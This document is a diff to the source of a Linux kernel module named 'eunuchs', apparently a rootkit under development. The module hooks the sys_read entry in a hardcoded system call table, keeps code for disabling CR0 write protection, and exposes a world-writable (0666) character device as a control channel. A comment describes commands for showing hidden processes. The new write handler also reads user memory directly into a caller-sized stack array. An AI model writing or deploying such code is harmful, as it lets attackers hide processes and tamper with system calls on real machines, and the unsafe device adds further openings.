@@ -35,25 +35,25 @@ MODULE_VERSION("1.0");
 MODULE_ALIAS("yes");
 
 /* This is the original value of CR0 */
-unsigned original_cr0;
+static unsigned original_cr0;
 
-/* BLOCK DEVICE */
+/* CHAR DEVICE */
 static struct class *eunuchs_cl;    // for class descriptor
 static int eunuchs_dev_maj_number;  // major number for device
 
-int eunuchs_block_open(struct inode *i, struct file *f)
+int eunuchs_char_open(struct inode *i, struct file *f)
 {
     /* printk("device open()\n"); */
     return 0;
 }
 
-int eunuchs_block_release(struct inode *i, struct file *f)
+int eunuchs_char_release(struct inode *i, struct file *f)
 {
     /* printk("device release()\n"); */
     return 0;
 }
 
-ssize_t eunuchs_block_read(struct file *f, char __user *buf, size_t len, loff_t *off)
+ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off)
 {
     /* printk("device read()\n"); */
     debug("read() got [%s] [%d bytes]\n", buf, len);
@@ -69,23 +69,43 @@ ssize_t eunuchs_block_read(struct file *f, char __user *buf, size_t len, loff_t 
  *     if buf is "showp 123", show process with pid 123.
  *     etc...
  **/
-ssize_t eunuchs_block_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
+ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
     /* printk("device write()\n"); */
-    debug("write() got [%s] [%d bytes]\n", buf, len);
+    char a[len+1];
+    size_t i;
+
+    /* only care about things up to newline (or null term) */
+    for(i = 0; i < len; i++)
+    {
+        if(buf[i] != '\n')
+            a[i] = buf[i];
+        else
+            break;
+    }
+    a[i] = '\0';
+    debug("write() got [%s] [%d bytes]\n", a, len);
     return len;
 }
 
 static struct file_operations eunuchs_fops =
 {
     .owner = THIS_MODULE,
-    .read = eunuchs_block_read,
-    .write = eunuchs_block_write,
-    .open = eunuchs_block_open,
-    .release = eunuchs_block_release
+    .read = eunuchs_char_read,
+    .write = eunuchs_char_write,
+    .open = eunuchs_char_open,
+    .release = eunuchs_char_release
 };
 
-/* Creates a block device so that we can communicate with the lkm from userland */
+/* changes the permissions on the char device to be 0666 */
+char* eunuchs_devnode(struct device *dev, umode_t *mode)
+{
+    if(mode)
+        *mode = 0666;
+    return NULL;
+}
+
+/* Creates a char device so that we can communicate with the lkm from userland */
 int eunuchs_dev_init()
 {
     if((eunuchs_dev_maj_number = register_chrdev(0, EUNUCHS_DEVICE_NAME, &eunuchs_fops)) < 0)
@@ -100,6 +120,8 @@ int eunuchs_dev_init()
         unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
         return -1;
     }
+    eunuchs_cl->devnode = eunuchs_devnode;
+
     if(device_create(eunuchs_cl, NULL, MKDEV(eunuchs_dev_maj_number, 0), NULL, EUNUCHS_DEVICE_NAME) == NULL)
     {
         debug("device_create() failed\n");
@@ -107,12 +129,12 @@ int eunuchs_dev_init()
         unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
         return -1;
     }
-    
+
     debug("device created\n");
     return 0;
 }
 
-/* Removes the block device */
+/* Removes the char device */
 int eunuchs_dev_remove()
 {
     device_destroy(eunuchs_cl, MKDEV(eunuchs_dev_maj_number, 0));
@@ -134,7 +156,6 @@ static unsigned long *sct = 0xc167b180;
 
 /* Pointers to save the original functions to. */
 static typeof(sys_read) *orig_read;
-
 asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
 {
     /* printk("reading..\n"); */
@@ -167,6 +188,7 @@ void cr0_disable_write()
 /* Installs our hooks, saving the old system call function pointers */
 int eunuchs_hooks_install()
 {
+    debug("installing hooks\n");
     orig_read = (typeof(sys_read) *)sct[__NR_read];
     sct[__NR_read] = (void *)&eunuchs_read;
 
@@ -176,6 +198,7 @@ int eunuchs_hooks_install()
 /* Removes our hooks, restoring the original system call function pointers */
 void eunuchs_hooks_remove()
 {
+    debug("removing hooks\n");
     sct[__NR_read] = (void *)orig_read;
 }
 
@@ -186,7 +209,7 @@ int eunuchs_init()
 {
     debug("init\n");
 
-    /* set up block device */
+    /* set up char device */
     if(eunuchs_dev_init() == -1)
         return -1;
 
